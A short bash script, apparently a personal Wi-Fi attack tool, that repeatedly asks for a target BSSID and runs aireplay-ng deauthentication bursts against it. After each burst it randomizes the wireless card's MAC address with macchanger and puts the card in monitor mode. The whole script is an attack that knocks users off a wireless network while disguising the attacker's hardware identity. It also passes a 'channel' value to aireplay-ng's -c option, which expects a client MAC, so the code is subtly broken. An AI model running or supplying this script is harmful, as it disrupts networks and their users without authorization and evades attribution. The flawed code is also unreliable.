#! /bin/bash

while true
do
	echo "Enter the bssid"
	read bssid
	echo "Enter the channel:"
	read channel
	aireplay-ng -0 5 -a $bssid  -c $channel wlo1
	ifconfig wlo1 down
	macchanger -r wlo1 | grep "New MAC"
	iwconfig wlo1 mode monitor
	ifconfig wlo1 up
	iwconfig wlo1 | grep Mode
	sleep 3
	echo "Waiting!!!"
done
